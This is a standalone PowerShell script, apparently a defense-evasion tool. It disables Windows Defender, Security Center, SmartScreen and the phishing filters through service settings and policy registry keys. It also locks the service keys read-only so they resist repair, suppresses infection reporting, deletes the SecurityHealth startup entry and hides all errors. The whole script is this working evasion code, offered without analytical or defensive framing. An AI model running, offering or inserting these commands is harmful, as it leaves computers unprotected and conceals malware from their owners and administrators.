function Set-Registry-ReadOnly($regpath) {
  $acl=Get-Acl $regpath
  $acl.SetAccessRuleProtection($True,$True)
  foreach ($a in $acl.Access) {
    Try{
      $u=$a.IdentityReference
      $propagation=$a.PropagationFlags
      $rule=New-Object System.Security.AccessControl.RegistryAccessRule($u,"ReadKey",@("ObjectInherit","ContainerInherit"),"None","Allow")
      $acl.PurgeAccessRules($u)
      $acl.SetAccessRule($rule)
    }
    Catch {}
  }
  Try{
    Set-Acl -ErrorAction SilentlyContinue $regpath $acl | Out-Null;
  }
  Catch {}
}

$bservices=@(
"wscsvc*" #WSCSVC (Windows Security Center)
"SecurityHealthService*" #Windows Security Health Servce
"WinDefend*" #Windows Defender Service
"WdNisSvc"
"Sense"
)

function fix-services() {
  foreach ($bservice in $bservices) {
    Set-ItemProperty -ErrorAction SilentlyContinue "HKLM:\SYSTEM\CurrentControlSet\Services\$bservice" "Start" 4 | Out-Null
    Set-Registry-ReadOnly "HKLM:\SYSTEM\CurrentControlSet\Services\$bservice"
  }
}

function fix-registry() {
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f| Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f| Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v DontReportInfectionInformation /t REG_DWORD /d 1 /f| Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f| Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f| Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f| Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f| Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f| Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 1 /f| Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f| Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v SmartScreenEnabled /t REG_DWORD /d 0 /f | Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\PhishingFilter" /v EnabledV9 /t REG_DWORD /d 0 /f | Out-Null
  reg add "HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v EnabledV9 /t REG_DWORD /d 0 /f| Out-Null
  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f| Out-Null
  reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f| Out-Null
  reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f| Out-Null
  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost\EnableWebContentEvaluation" /v Enabled /t REG_DWORD /d 0 /f| Out-Null
  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost\EnableWebContentEvaluation" /v PreventOverride /t REG_DWORD /d 0 /f| Out-Null
  reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SecurityHealth /f| Out-Null
}

fix-services
fix-registry
